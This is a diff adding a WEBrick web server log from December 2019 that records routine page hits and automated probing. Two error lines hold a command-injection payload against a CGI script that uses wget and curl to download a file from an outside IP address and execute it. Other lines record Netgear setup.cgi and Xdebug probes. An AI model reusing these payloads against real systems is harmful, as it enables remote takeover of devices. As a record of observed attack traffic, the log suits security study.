@@ -1,0 +1,20 @@
+[2019-12-09 02:57:55] INFO  WEBrick 1.4.2
+[2019-12-09 02:57:55] INFO  ruby 2.5.1 (2018-03-29) [x86_64-linux-gnu]
+[2019-12-09 02:57:55] INFO  WEBrick::HTTPServer#start: pid=424 port=80
+139.162.119.197 - - [09/Dec/2019:03:31:57 +0000] "GET / HTTP/1.1" 200 1574 0.1358
+45.70.5.213 - - [09/Dec/2019:03:38:44 +0000] "GET / HTTP/1.1" 200 1574 0.0060
+110.172.153.170 - - [09/Dec/2019:04:21:35 +0000] "GET / HTTP/1.1" 200 1574 0.0062
+83.167.17.144 - - [09/Dec/2019:05:52:59 +0000] "GET / HTTP/1.1" 200 1574 0.0062
+[2019-12-09 06:34:35] ERROR bad Request-Line `POST /cgi-bin/protected/discover_and_manage.cgi?action=snmp_browser&hst_id=none&snmpv3_profile_id=&ip_address=|wget http://80.82.67.209/richard; curl -O http://80.82.67.209/richard; chmod +x richard; sh richard;/evil.php|php&snmp_ro_string=public&mib_oid=system&mib_oid_manual=.1.3.6.1.2.1.1&snmp_version=1 HTTP/1.0'.
+[2019-12-09 06:34:36] ERROR bad Request-Line `POST /cgi-bin/protected/discover_and_manage.cgi?action=snmp_browser&hst_id=none&snmpv3_profile_id=&ip_address=|wget http://80.82.67.209/richard; curl -O http://80.82.67.209/richard; chmod +x richard; sh richard;/evil.php|php&snmp_ro_string=public&mib_oid=system&mib_oid_manual=.1.3.6.1.2.1.1&snmp_version=1 HTTP/1.0'.
+87.89.133.213 - - [09/Dec/2019:06:38:47 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 562 0.0058
+[2019-12-09 06:38:49] ERROR Errno::ECONNRESET: Connection reset by peer @ io_fillbuf - fd:11 
+	/usr/lib/ruby/2.5.0/webrick/httpserver.rb:82:in `eof?'
+	/usr/lib/ruby/2.5.0/webrick/httpserver.rb:82:in `run'
+	/usr/lib/ruby/2.5.0/webrick/server.rb:307:in `block in start_thread'
+168.194.86.200 - - [09/Dec/2019:06:54:52 +0000] "GET / HTTP/1.1" 200 1574 0.0071
+85.105.213.23 - - [09/Dec/2019:08:27:15 +0000] "GET / HTTP/1.1" 200 1574 0.0050
+109.94.120.38 - - [09/Dec/2019:08:53:47 +0000] "GET / HTTP/1.1" 200 1574 0.0070
+177.177.57.224 - - [09/Dec/2019:08:54:59 +0000] "GET / HTTP/1.1" 200 1574 0.0028
+181.165.173.249 - - [09/Dec/2019:10:08:05 +0000] "GET / HTTP/1.1" 200 1574 0.0093
+185.153.196.97 - - [09/Dec/2019:10:55:30 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1574 0.0057
